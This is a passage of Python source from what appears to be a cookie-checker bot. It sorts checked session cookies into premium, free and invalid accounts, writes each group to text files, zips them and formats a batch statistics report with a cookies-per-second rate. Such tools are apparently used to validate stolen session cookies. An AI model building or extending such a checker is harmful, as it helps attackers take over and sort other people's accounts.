{S['double_line'] * 48}
                    BATCH SUMMARY REPORT
{S['double_line'] * 48}

📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🆔 User ID: {user_id}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 STATISTICS:

   📦 Total Cookies Checked: {batch_data['total']:,}
   ✅ Valid Accounts: {batch_data['valid']:,}
   ✨ Premium Accounts: {batch_data['premium']:,}
   ✧ Free Accounts: {batch_data['free']:,}
   ❌ Invalid Cookies: {batch_data['invalid']:,}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ PERFORMANCE:

   📈 Success Rate: {success_rate:.1f}%
   ⏱️ Total Time: {int(batch_data['start_time'])} seconds
   🚀 Speed: {batch_data['total'] / max(batch_data['start_time'], 1):.1f} cookies/sec

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{S['copyright']} {DEVELOPER} | {S['link']} {CHANNEL_LINK}
"""
    
    # Write all files
    premium_file = f"{base_path}/premium_accounts.txt"
    free_file = f"{base_path}/free_accounts.txt"
    invalid_file = f"{base_path}/invalid_accounts.txt"
    summary_file = f"{base_path}/summary.txt"
    
    with open(premium_file, 'w', encoding='utf-8') as f:
        f.writelines(premium_results) if premium_results else f.write("No premium accounts found\n")
    
    with open(free_file, 'w', encoding='utf-8') as f:
        f.writelines(free_results) if free_results else f.write("No free accounts found\n")
    
    with open(invalid_file, 'w', encoding='utf-8') as f:
        f.writelines(invalid_results) if invalid_results else f.write("No invalid accounts\n")
    
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write(summary_content)
    
    # Create ZIP archive
    zip_path = f"{base_path}.zip"
    with zipfile.ZipFile(zip_path, 'w') as zf:
        zf.write(premium_file, "premium_accounts.txt")
        zf.write(free_file, "free_accounts.txt")
        zf.write(invalid_file, "invalid_accounts.txt")
        zf.write(summary_file, "summary.txt")
    
    return {
        'premium': premium_file,
        'free': free_file,
        'invalid': invalid_file,
        'summary': summary_file,
        'zip': zip_path,
        'folder': base_path
    }


# ⬇️⬇️⬇️ PART 8 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
